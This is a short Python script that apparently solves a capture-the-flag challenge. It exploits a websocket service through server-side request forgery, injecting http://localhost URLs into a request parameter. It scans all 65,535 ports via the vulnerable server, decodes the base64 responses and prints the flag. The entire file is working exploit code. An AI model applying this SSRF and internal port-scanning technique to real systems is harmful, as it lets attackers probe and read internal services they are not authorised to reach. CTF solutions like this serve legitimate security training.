from websocket import create_connection
from json import dumps,loads
from base64 import b64decode

def ssrf(port):
    # Initiate websocket connection
    ws = create_connection('ws://127.0.0.1:8003/mysocket')
    # Payload
    payload = {
    'type': 'humm',
    'param': f'http://localhost:{port}'
    }
    # Send payload through websocket
    ws.send(dumps(payload))
    # Get server response
    result = ws.recv()
    ws.close()
    return loads(result)

if __name__ == '__main__':
    # scan all local ports
    for port in range(1, 65536):
        obj = ssrf(port)
        if 'content' in obj:
            # decode base64 to string
            response = b64decode(obj['content'].replace('data:;base64,', '')).decode()
            # if flag in response 
            if 'CybertHub' in response:
                # print flag
                print(response) 
                break
